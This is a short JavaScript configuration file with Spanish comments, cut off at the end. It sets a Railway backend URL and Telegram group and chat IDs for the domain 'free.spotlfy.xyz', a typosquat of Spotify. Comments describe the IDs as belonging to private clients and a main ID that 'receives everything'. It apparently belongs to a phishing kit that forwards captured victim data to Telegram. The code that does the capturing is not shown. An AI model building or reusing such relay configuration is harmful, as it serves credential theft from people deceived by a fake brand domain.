const SERVER_URL = 'https://backend-production-d69c4cec.up.railway.app';  // TU URL RAILWAY

// Configuración específica para FREE DOMAIN
const CONFIG_IDS = {
    GROUP_ID: '-1004493468867',  // ID del grupo de Telegram para free.spotlfy.xyz
    PRIVATES: ['7574919030'],     // Clientes privados del dominio free.spotlfy.xyz
    TEST_ID: '7707049896'         // Tu ID principal (recibe todo para testear)
};

// === SELECCIÓN AUTOMÁTICA POR ORIGEN (DEMO FREE DOMAIN) ===
function getConfig(origin) {
    if (origin.includes('free.spotlfy.xyz')) {
        return CONFIG_IDS;
    } else {
        // Fallback al dominio por defecto si no coincide
        return CONFIG_IDS;
    }
}

// === ID PRINCIPAL PARA TESTING (RECIBE TODO) ===
const MAIN_TEST_ID = '7707049896';  /
